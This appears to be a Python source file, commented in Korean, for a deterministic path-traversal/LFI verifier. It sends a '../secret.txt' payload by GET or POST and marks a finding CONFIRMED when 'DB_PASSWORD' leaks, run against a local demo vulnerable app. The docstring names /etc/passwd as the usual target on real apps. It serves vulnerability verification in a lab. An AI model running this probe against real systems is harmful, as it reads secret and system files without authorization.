"""
Path Traversal / LFI 검증기 — 같은 결정론 철학, LLM 없음.

원리: "../" 로 웹루트 밖으로 나가 민감 파일을 읽을 수 있는가?
  - 읽어지면(표식 발견) → CONFIRMED
  - 막히면(403 등)      → FALSE_POSITIVE
표식(MARKER): 데모 과녁에선 웹루트 밖 secret.txt 의 "DB_PASSWORD".
             실제 앱에선 흔히 /etc/passwd 의 "root:x:0:0" 을 표식으로 쓴다.

GET/POST 둘 다 지원 — method 인자로 선택. 판정 로직은 요청 방식과 무관하게 동일.
"""
import urllib.request
import urllib.parse
import urllib.error

MARKER = "DB_PASSWORD"


def fetch(base_url, param, value, method="GET"):
    """base_url 에 payload 를 실어 요청. (상태코드, 본문) 반환.
       GET: ?param=value. POST: form-urlencoded 바디."""
    if method.upper() == "POST":
        data = urllib.parse.urlencode({param: value}).encode("utf-8")
        req = urllib.request.Request(
            base_url, data=data, method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"})
    else:
        url = base_url + "?" + urllib.parse.urlencode({param: value})
        req = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def verify(base_url, param="file", method="GET"):
    payload = "../secret.txt"                 # 웹루트 밖으로 한 단계 탈출
    _, body = fetch(base_url, param, payload, method)
    ev = {"method": method, "payload": payload, "response": body}
    if MARKER in body:
        return "CONFIRMED", "'../' 로 웹루트 밖 파일을 읽어냄 → 경로 탈출 성공", ev
    return "FALSE_POSITIVE", "경로 탈출이 차단됨(웹루트 밖 접근 불가)", ev


if __name__ == "__main__":
    from vuln_app import serve_in_thread
    srv = serve_in_thread(8014)
    v, why, ev = verify("http://127.0.0.1:8014/download")
    print("/download", v, "|", why)
    print("  유출:", ev["response"])
    srv.shutdown()